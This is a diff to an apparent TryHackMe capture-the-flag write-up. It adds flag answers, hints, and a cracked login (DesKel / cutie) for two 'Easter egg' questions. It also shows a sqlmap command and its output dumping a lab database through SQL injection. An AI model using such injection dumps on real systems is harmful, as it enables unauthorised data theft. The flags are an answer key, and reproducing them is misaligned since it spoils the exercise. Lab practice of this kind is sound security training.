@@ -434,8 +434,8 @@ Table: nothing_inside
 
 
 > 2.5 - <em>Easter 5</em><br>
-> <code>Question Hint</code>:
->> <strong>______</strong>
+> <code>Question Hint</code>: Another sqli
+>> <strong>THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}</strong>
 <p></p>
 
 <pre><code>root@root@ip-[Attack_IP]:~# sqlmap -r request --dbs --level 3 --risk 3 -T nothing_inside --dump-all
@@ -468,25 +468,28 @@ Table: nothing_inside
 [22:45:04] [INFO] recognized possible password hashes in column 'password'
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 [22:45:09] [INFO] writing hashes to a temporary file '/tmp/sqlmapt34iIC14886/sqlmaphashes-XYsiDb.txt' 
-do you want to crack them via a dictionary-based attack? [Y/n/q] 
-
-                                                              
-Database: THM_f0und_m3                                                                                                                      
+do you want to crack them via a dictionary-based attack? [Y/n/q]                                                          
+Database: THM_f0und_m3                                                                                                                   
 Table: user
-[2 entries]
-
-
-  
+[2 entries] 
 </code></pre>
 
 ![image](https://github.com/user-attachments/assets/dc41a558-f11a-4fef-98ca-e27711b03a3b)
 
+<p>User: DesKel<br>
+Password: cutie</p>
 
+![image](https://github.com/user-attachments/assets/26d6e431-b377-4c90-b693-214c54fd0954)
 
+![image](https://github.com/user-attachments/assets/6974dd72-3c96-470f-a51d-8ea3cc9cc7a6)
 
 > 2.6 - <em>Easter 6</em><br>
->> <strong>______</strong><br>
-<p><br></p>
+> <code>Question Hint</code>: Look out for the response header.
+>> <strong>THM{l37'5_p4r7y_h4rd}</strong>
+<p></p>
+
+![image](https://github.com/user-attachments/assets/d97e119a-f9ed-4350-b6ad-6c346e267f6b)
+
 
 > 2.7 - <em>Easter 7</em><br>
 >> <strong>______</strong><br>
